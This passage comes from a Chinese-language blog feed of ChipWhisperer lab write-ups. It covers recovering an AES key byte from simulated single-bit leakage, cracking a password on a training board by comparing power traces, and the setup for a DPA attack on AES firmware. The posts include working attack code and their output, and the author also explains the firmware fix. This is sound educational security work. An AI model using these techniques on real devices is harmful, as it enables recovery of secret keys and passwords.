<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">guess_list = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):   </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Get a hypothetical leakage list - use aes_internal(guess, input_byte) and mask off to only get value of lowest bit</span></span><br><span class="line">    hypothetical_leakage = [aes_internal(guess, input_byte) &amp; <span class="number">0x01</span> <span class="keyword">for</span> input_byte <span class="keyword">in</span> input_data]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Use our function</span></span><br><span class="line">    same_count = num_same(hypothetical_leakage, leaked_data)   </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Track the number of correct bits</span></span><br><span class="line">    guess_list[guess] = same_count</span><br><span class="line"></span><br><span class="line"><span class="comment">#Use np.argsort to generate a list of indicies from low to high, then [::-1] to reverse the list to get high to low.</span></span><br><span class="line">sorted_list = np.argsort(guess_list)[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#Print top 5 only</span></span><br><span class="line"><span class="keyword">for</span> guess <span class="keyword">in</span> sorted_list[<span class="number">0</span>:<span class="number">5</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Key Guess &#123;:02X&#125; = &#123;:04d&#125; matches&quot;</span>.<span class="built_in">format</span>(guess, guess_list[guess]))</span><br></pre></td></tr></table></figure>

<p>结果如下，还是很明显的，EF最多，而且一字不纳</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Key Guess EF = <span class="number">1000</span> matches</span><br><span class="line">Key Guess C5 = 0578 matches</span><br><span class="line">Key Guess <span class="number">24</span> = 0572 matches</span><br><span class="line">Key Guess B8 = 0572 matches</span><br><span class="line">Key Guess F9 = 0570 matches</span><br></pre></td></tr></table></figure>

<p>接下来就是如何猜测key中的下一个字节呢？，其实只要稍微修改下前面的leaked_data函数代码就ok，比如前面一个字节，那么就是第‘3’位的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leaked_data = [(aes_secret(a)&gt;&gt;3 &amp; 0x01) for a in input_data]</span><br></pre></td></tr></table></figure>

<p>继续完善leaked_data函数，让它根据随机数来决定返回正确加密结果还是0，来模拟噪声</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_secret_chance</span>(<span class="params">inputdata, chance_correct</span>):</span></span><br><span class="line">        secret_key = <span class="number">0xEF</span></span><br><span class="line">        correct = aes_internal(secret_key, inputdata)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">100</span>) &lt;= chance_correct:</span><br><span class="line">            <span class="keyword">return</span> correct</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_same</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) != <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Arrays must be same length!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Count how many list items match up</span></span><br><span class="line">    same = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, _ <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">        <span class="keyword">if</span> a[i] == b[i]:</span><br><span class="line">            same += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> same</span><br><span class="line">        </span><br><span class="line"><span class="comment">#This sets the percentage of correct observations</span></span><br><span class="line">chances_to_try = <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">105</span>, <span class="number">5</span>)</span><br><span class="line">traces_needed = []</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> chance_correct <span class="keyword">in</span> chances_to_try:</span><br><span class="line">    leaked_data = [(aes_secret_chance(a, chance_correct) &amp; <span class="number">0x01</span>) <span class="keyword">for</span> a <span class="keyword">in</span> input_data]</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#Try for number of traces</span></span><br><span class="line">    <span class="keyword">for</span> traces <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(input_data), <span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        guess_list = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    </span><br><span class="line">            <span class="comment">#Get a hypothetical leakage list - use aes_internal(guess, input_byte) and mask off to only get value of lowest bit</span></span><br><span class="line">            hypothetical_leakage = [aes_internal(guess, input_byte) &amp; <span class="number">0x01</span> <span class="keyword">for</span> input_byte <span class="keyword">in</span> input_data[<span class="number">0</span>:traces]]</span><br><span class="line"></span><br><span class="line">            <span class="comment">#Use our function</span></span><br><span class="line">            same_count = num_same(hypothetical_leakage, leaked_data[<span class="number">0</span>:traces])</span><br><span class="line"></span><br><span class="line">            <span class="comment">#Track the number of correct bits</span></span><br><span class="line">            guess_list[guess] = same_count</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Use np.argsort to generate a list of indicies from low to high, then [::-1] to reverse the list to get high to low.</span></span><br><span class="line">        sorted_list = np.argsort(guess_list)[::-<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> sorted_list[<span class="number">0</span>] == <span class="number">0xEF</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found key at %d %% correct data with %d encryptions&quot;</span>%(chance_correct, traces))</span><br><span class="line">            traces_needed.append(traces)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> sorted_list[<span class="number">0</span>] != <span class="number">0xEF</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Failed to find answer for %d %% - need more traces&quot;</span>%(chance_correct))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Found key at 20 % correct data with 97 encryptions</span><br><span class="line">Found key at 25 % correct data with 10 encryptions</span><br><span class="line">Found key at 30 % correct data with 64 encryptions</span><br><span class="line">Found key at 35 % correct data with 40 encryptions</span><br><span class="line">Found key at 40 % correct data with 20 encryptions</span><br><span class="line">Found key at 45 % correct data with 39 encryptions</span><br><span class="line">Found key at 50 % correct data with 34 encryptions</span><br><span class="line">Found key at 55 % correct data with 15 encryptions</span><br><span class="line">Found key at 60 % correct data with 10 encryptions</span><br><span class="line">Found key at 65 % correct data with 28 encryptions</span><br><span class="line">Found key at 70 % correct data with 9 encryptions</span><br><span class="line">Found key at 75 % correct data with 9 encryptions</span><br><span class="line">Found key at 80 % correct data with 9 encryptions</span><br><span class="line">Found key at 85 % correct data with 15 encryptions</span><br><span class="line">Found key at 90 % correct data with 9 encryptions</span><br><span class="line">Found key at 95 % correct data with 9 encryptions</span><br><span class="line">Found key at 100 % correct data with 9 encryptions</span><br></pre></td></tr></table></figure>

<p>对结果画图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import matplotlib.pylab as plt</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(6,3), dpi=150)</span><br><span class="line">plt.plot(chances_to_try, traces_needed)</span><br><span class="line">plt.title(&#x27;Guesses for Single Bit Observation&#x27;)</span><br><span class="line">plt.xlabel(&#x27;% Chance of Correct Observation&#x27;)</span><br><span class="line">plt.ylabel(&#x27;Encryptions To Recover Key&#x27;)</span><br></pre></td></tr></table></figure>

<p>从图可知，70%以上正确率的基本上都只需要少量数据就可以恢复正确的key</p>
<p><img src="https://re1own.github.io/assets/img/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%AAbit%E6%81%A2%E5%A4%8DAES-key/image-20230526220532092.png" alt="image-20230526220532092"></p>
<p>Reference</p>
<p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
]]></content>
      <tags>
        <tag>SCA</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>测信道攻击——利用能耗破解密码</title>
    <url>/2023/05/24/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E8%83%BD%E8%80%97%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>硬件设置：</p>
<p>SCOPETYPE: CWLite/CW1200选OPENADC，CWNano选CWNANO</p>
<p>PLATFROM: CWLITEARM/CW308_STM32F3/CWLITEXMEGA/CW308_XMEGA</p>
<p>SS_VER好像没啥差别，直接设置为’SS_VER_2_1’就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCOPETYPE = &#x27;OPENADC&#x27;</span><br><span class="line">PLATFORM = &#x27;CWLITEARM&#x27;</span><br><span class="line">SS_VER = &#x27;SS_VER_2_1&#x27;</span><br></pre></td></tr></table></figure>

<p>相比实验一，这里用一个脚本直接代替连接Scope和一些基本的setup。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%run &quot;../../Setup_Scripts/Setup_Generic.ipynb&quot;33</span><br></pre></td></tr></table></figure>

<p>编译固件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%%bash -s &quot;$PLATFORM&quot; &quot;$SS_VER&quot;</span><br><span class="line">cd ../../../hardware/victims/firmware/basic-passwdcheck</span><br><span class="line">make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j</span><br></pre></td></tr></table></figure>

<p>把固件写入板子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cw.program_target(scope, prog, &quot;../../../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-&#123;&#125;.hex&quot;.format(PLATFORM))</span><br></pre></td></tr></table></figure>

<h2 id="字符能耗的比较"><a href="#字符能耗的比较" class="headerlink" title="字符能耗的比较"></a>字符能耗的比较</h2><p>定义一个函数cap_pass_trace用来来尝试密码并返回功率迹线：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cap_pass_trace</span>(<span class="params">pass_guess</span>):</span></span><br><span class="line">    reset_target(scope)</span><br><span class="line">    num_char = target.in_waiting()</span><br><span class="line">    <span class="keyword">while</span> num_char &gt; <span class="number">0</span>:</span><br><span class="line">        target.read(num_char, <span class="number">10</span>)</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        num_char = target.in_waiting()</span><br><span class="line"></span><br><span class="line">    scope.arm()</span><br><span class="line">    target.write(pass_guess)</span><br><span class="line">    ret = scope.capture()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Timeout happened during acquisition&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    trace = scope.get_last_trace()</span><br><span class="line">    <span class="keyword">return</span> trace</span><br></pre></td></tr></table></figure>

<p>把轨迹线设为3000</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scope.adc.samples = 3000</span><br></pre></td></tr></table></figure>

<p>cap_pass_trace里的参数就是密码，”h\n”表示密码是一个h</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trace_test = cap_pass_trace(&quot;h\n&quot;)</span><br><span class="line"></span><br><span class="line">#Basic sanity check</span><br><span class="line">assert(len(trace_test) == 3000)</span><br><span class="line">print(&quot;✔️ OK to continue!&quot;)</span><br></pre></td></tr></table></figure>

<p>以上命令执行完后，发现板子相比之前的实验多了一个红色的灯了，现在是红绿蓝灯都亮了</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524011609333.png" alt="image-20230524011609333" style="zoom: 33%;">

<p>接下来就是破解密码，首先这里透露说密码是以h开头的，并且长度为5。接下来比较输入’h’和’z’作为密码时的能量消耗波形。</p>
<p>分别获取’h\n’和’z\n’的能量消耗</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trace_h = cap_pass_trace(&quot;h\n&quot;)</span><br><span class="line">trace_z = cap_pass_trace(&quot;z\n&quot;)</span><br></pre></td></tr></table></figure>

<p>展示’h\n’的能耗波形：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">plt.plot(trace_h)</span><br></pre></td></tr></table></figure>

<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524014826066.png" alt="image-20230524014826066" style="zoom:50%;">

<p>对比h和z的能耗图，发现确实有差别，但这个图貌不太好看。。。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plt.plot(trace_z)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>



<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524015249412.png" alt="image-20230524015249412" style="zoom:50%;">

<p>上面的波形图太长了，从上面可以发现是在0～500内有变化，我们把轨迹线设为500，这下变化明显多了！</p>
<p><code>scope.adc.samples = 500</code></p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524015735367.png" alt="image-20230524015735367" style="zoom:50%;">



<h2 id="利用能耗图破解密码"><a href="#利用能耗图破解密码" class="headerlink" title="利用能耗图破解密码"></a>利用能耗图破解密码</h2><p>接下来把所有字母都跑一遍，看看它们的能耗波差别。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">scope.adc.samples = <span class="number">500</span></span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line"></span><br><span class="line">LIST_OF_VALID_CHARACTERS=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"><span class="keyword">for</span> CHARACTER <span class="keyword">in</span> LIST_OF_VALID_CHARACTERS:</span><br><span class="line">    trace = cap_pass_trace(CHARACTER + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    plt.plot(trace, label=CHARACTER)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524020432240.png" alt="image-20230524020432240" style="zoom:50%;">

<p>上图颜色重叠很厉害，改成150发现差别明显些了</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524020656224.png" alt="image-20230524020656224" style="zoom:50%;">

<p>再改成60，发现很多字母的能耗其实差不多，然而，根据150和60的图发现有条灰色线条最不一样！这条曲线意味着输入了一个正确的密码。根据颜色灰色的是h或者r，结合已知，正确的密码第一个字母就是h，所以这里最不一样的灰色曲线代表的就是字母h！</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524021221911.png" alt="image-20230524021221911" style="zoom:50%;">

<p>接下来就是枚举下一个字母了，改下循环里的trace就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trace = cap_pass_trace(&#x27;h&#x27;+CHARACTER + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>

<p>哈哈，发现粉色的最不一样，但python画图的这个库不太友好，得肉眼分辨颜色对应的字母</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524023949969.png" alt="image-20230524023949969" style="zoom:50%;">

<p>我们改用plotly画图，相比python的画图，它只要鼠标悬浮在某个位置时，就会显示该点对应的曲线信息，这样一来就容易区分是哪个字符了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> plotly.graph_objects <span class="keyword">as</span> go</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">fig = go.Figure()</span><br><span class="line"></span><br><span class="line">LIST_OF_VALID_CHARACTERS=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"><span class="keyword">for</span> CHARACTER <span class="keyword">in</span> LIST_OF_VALID_CHARACTERS:</span><br><span class="line">    trace = cap_pass_trace(<span class="string">&#x27;h&#x27;</span>+CHARACTER + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    fig.add_trace(go.Scatter(x=np.array(<span class="built_in">range</span>(trace.shape[<span class="number">0</span>])), y=trace, mode=<span class="string">&#x27;lines&#x27;</span>, name=CHARACTER,text=CHARACTER))</span><br><span class="line">fig.show()</span><br></pre></td></tr></table></figure>

<p>可以推断下一个字母为’0’</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524024602795.png" alt="image-20230524024602795" style="zoom:67%;">

<p>如果不知道任何密码提示，要自动破解正确密码，一个简单的方法是用0x00，即空密码和其他输入比较。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">ref_trace = cap_pass_trace(<span class="string">&quot;\x00\n&quot;</span>)[<span class="number">0</span>:<span class="number">500</span>]</span><br><span class="line">plt.plot(ref_trace)</span><br><span class="line"></span><br><span class="line">other_trace = cap_pass_trace(<span class="string">&quot;c\n&quot;</span>)[<span class="number">0</span>:<span class="number">500</span>]</span><br><span class="line">plt.plot(other_trace)</span><br></pre></td></tr></table></figure>

<p>运行后’c’和0x00几乎重叠了，那么说明c也不是正确密码，所以说要找正确密码就是找和0x00不一样的线条对应的字母</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524025430664.png" alt="image-20230524025430664" style="zoom:50%;">

<p>接下来，为了更高效，我们可以枚举所有的字母然后用它们的能量曲线减去0x00的能量曲线，就能很快获得正确密码了！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">scope.adc.samples = <span class="number">500</span></span><br><span class="line">LIST_OF_VALID_CHARACTERS=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">ref_trace = cap_pass_trace( <span class="string">&quot;\x00\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> CHARACTER <span class="keyword">in</span> LIST_OF_VALID_CHARACTERS:</span><br><span class="line">    trace = cap_pass_trace(CHARACTER + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    plt.plot(trace - ref_trace, label=CHARACTER)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>这样一眼就能看出，灰色的线是最不一样的，这样做差之后被暴露得非常明显了</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524031016051.png" alt="image-20230524031016051" style="zoom:50%;">

<h2 id="数值差分破解"><a href="#数值差分破解" class="headerlink" title="数值差分破解"></a>数值差分破解</h2><p>还有一种表示和观察方法，将能耗波转化为数值，通过numpy的sum和abs来算数值上的差异</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">ref_trace = cap_pass_trace( &quot;\x00\n&quot;)</span><br><span class="line"></span><br><span class="line">LIST_OF_VALID_CHARACTERS=&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><span class="line">for CHARACTER in LIST_OF_VALID_CHARACTERS:</span><br><span class="line">    trace = cap_pass_trace(CHARACTER + &quot;\n&quot;)</span><br><span class="line">    diff = np.sum(np.abs(trace - ref_trace))</span><br><span class="line"></span><br><span class="line">    print(&quot;&#123;:1&#125; diff = &#123;:2&#125;&quot;.format(CHARACTER, diff))</span><br></pre></td></tr></table></figure>

<p>输出如下，正确密码拥有最大的差异值，那么h显而易见比其他的差分大得多得多，h就是正确的密码的第一个字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a diff = 17.154296875</span><br><span class="line">b diff = 9.833984375</span><br><span class="line">c diff = 16.4482421875</span><br><span class="line">d diff = 11.765625</span><br><span class="line">e diff = 11.4013671875</span><br><span class="line">f diff = 15.095703125</span><br><span class="line">g diff = 12.33984375</span><br><span class="line">h diff = 252.572265625</span><br><span class="line">i diff = 9.6181640625</span><br><span class="line">j diff = 16.408203125</span><br><span class="line">k diff = 8.705078125</span><br><span class="line">l diff = 12.8154296875</span><br><span class="line">m diff = 13.9345703125</span><br><span class="line">n diff = 12.439453125</span><br><span class="line">o diff = 9.48046875</span><br><span class="line">p diff = 15.83203125</span><br><span class="line">q diff = 10.2607421875</span><br><span class="line">r diff = 14.9423828125</span><br><span class="line">s diff = 11.76171875</span><br><span class="line">t diff = 10.2802734375</span><br><span class="line">u diff = 9.94140625</span><br><span class="line">v diff = 13.421875</span><br><span class="line">w diff = 11.310546875</span><br><span class="line">x diff = 10.4921875</span><br><span class="line">y diff = 10.4775390625</span><br><span class="line">z diff = 15.0595703125</span><br><span class="line">0 diff = 11.1748046875</span><br><span class="line">1 diff = 14.5146484375</span><br><span class="line">2 diff = 13.677734375</span><br><span class="line">3 diff = 13.3154296875</span><br><span class="line">4 diff = 10.490234375</span><br><span class="line">5 diff = 10.3642578125</span><br><span class="line">6 diff = 9.7861328125</span><br><span class="line">7 diff = 10.240234375</span><br><span class="line">8 diff = 10.2470703125</span><br><span class="line">9 diff = 14.3291015625&quot;</span><br></pre></td></tr></table></figure>

<p>最后，利用差分的方式，每次提取最大值，最后得出正确密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">LIST_OF_VALID_CHARACTERS=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">guessed_pwd = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line"></span><br><span class="line">    ref_trace = cap_pass_trace(guessed_pwd + <span class="string">&quot;\x00\n&quot;</span>)</span><br><span class="line">    m=<span class="number">0</span></span><br><span class="line">    c=<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> CHARACTER <span class="keyword">in</span> LIST_OF_VALID_CHARACTERS:</span><br><span class="line">        trace = cap_pass_trace(guessed_pwd + CHARACTER + <span class="string">&#x27;\x00\n&#x27;</span>)</span><br><span class="line">        diff = np.<span class="built_in">sum</span>(np.<span class="built_in">abs</span>(trace - ref_trace))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> diff &gt; <span class="number">25</span>:</span><br><span class="line"></span><br><span class="line">            guessed_pwd += CHARACTER</span><br><span class="line">            <span class="built_in">print</span>(guessed_pwd)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>正确密码为：h0px3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">h</span><br><span class="line">h0</span><br><span class="line">h0p</span><br><span class="line">h0px</span><br><span class="line">h0px3</span><br></pre></td></tr></table></figure>

<p>查看目标板固件中对正确密码处理的源码（在hardware/victims/firmware/basic-passwdcheck目录下的basic-passwdcheck.c文件中）。发现固件对密码错误的处理是直接break跳出循环，这样就会导致相比正确密码能耗的明显差别！而防范这个攻击的方式就是把break注释掉，让循环继续，最后做判断</p>
<img src="https://re1own.github.io/assets/img/测信道攻击——利用能耗破解密码/image-20230524033320168.png" alt="image-20230524033320168" style="zoom:50%;">



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这次实验极大的感受到了硬件安全的魅力所在，从写代码的角度来看，判断密码错误后确实没有必要继续进行判断了，这样能提高效率但也同时留下了非常严重的安全隐患。真的是没有一定安全的系统！！！</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
]]></content>
      <tags>
        <tag>SCA</tag>
        <tag>Power Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>测信道攻击——用DPA攻击固件中的AES</title>
    <url>/2023/05/26/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E7%94%A8DPA%E6%94%BB%E5%87%BB%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84AES/</url>
    <content><![CDATA[<p>上篇攻击AES的方法其实属于SPA，本实验用更牛逼的方法，DPA来攻击AES，而且是货真价实的AES。关于DPA，我前面有篇博客有所讲解（<a href="https://re1own.github.io/2023/05/20/SCA/">初识测信道攻击</a>)。下面开始环境配置，这里需要注意的是，notebook中给出的SS_VER是’SS_VER_1_1’，我运行后总是失败，换成前面实验用的SS_VER_2_1就好了。这里编译、上传固件、安装就不多解释了，与之前实验一致。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCOPETYPE = &#x27;OPENADC&#x27;</span><br><span class="line">PLATFORM = &#x27;CWLITEARM&#x27;</span><br><span class="line">CRYPTO_TARGET=&#x27;TINYAES128C&#x27;</span><br><span class="line">SS_VER=&#x27;SS_VER_2_1&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%run &quot;../../Setup_Scripts/Setup_Generic.ipynb&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%%bash -s <span class="string">&quot;<span class="variable">$PLATFORM</span>&quot;</span> <span class="string">&quot;<span class="variable">$CRYPTO_TARGET</span>&quot;</span> <span class="string">&quot;<span class="variable">$SS_VER</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> ../../../hardware/victims/firmware/simpleserial-aes</span><br><span class="line">make PLATFORM=<span class="variable">$1</span> CRYPTO_TARGET=<span class="variable">$2</span> SS_VER=<span class="variable">$3</span> -j</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cw.program_target(scope, prog, &quot;../../../hardware/victims/firmware/simpleserial-aes/simpleserial-aes-&#123;&#125;.hex&quot;.format(PLATFORM))</span><br></pre></td></tr></table></figure>

<p>抓取2500条能量迹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ktp = cw.ktp.Basic()</span><br><span class="line">trace_array = []</span><br><span class="line">textin_array = []</span><br><span class="line"></span><br><span class="line">key, text = ktp.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">target.set_key(key)</span><br><span class="line"></span><br><span class="line">N = <span class="number">2500</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tnrange(N, desc=<span class="string">&#x27;Capturing traces&#x27;</span>):</span><br><span class="line">    scope.arm()</span><br><span class="line">    </span><br><span class="line">    target.simpleserial_write(<span class="string">&#x27;p&#x27;</span>, text)</span><br><span class="line">    </span><br><span class="line">    ret = scope.capture()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target timed out!&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    response = target.simpleserial_read(<span class="string">&#x27;r&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    trace_array.append(scope.get_last_trace())</span><br><span class="line">    textin_array.append(text)</span><br><span class="line">    </span><br><span class="line">    key, text = ktp.<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure>

<p>在实验<a href="https://re1own.github.io/2023/05/25/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%AAbit%E6%81%A2%E5%A4%8DAES-key/">利用一个bit恢复AES key</a>中之所以能成功是攻击流中存在S-box。本次实验使用能量分析去破解AES密钥。之前的方法能生效是因为我们攻击的数据流就在S-box中，而实战中我们不知道数值，只知道能量消耗，要找到他们对应的二进制是比较困难的。而本攻击方式是利用S-box输出结果的一个bit（无论哪个都行）将能量分成两个部分（0和1），利用1消耗能量是大于0的，而且根据之前的实验，数据总线中数据的值与能量消耗之间有一定联系。DPA分析AES只需要整个能量迹包含了加密流程发生的时间段。</p>
<p>S-box是固定的：</p>
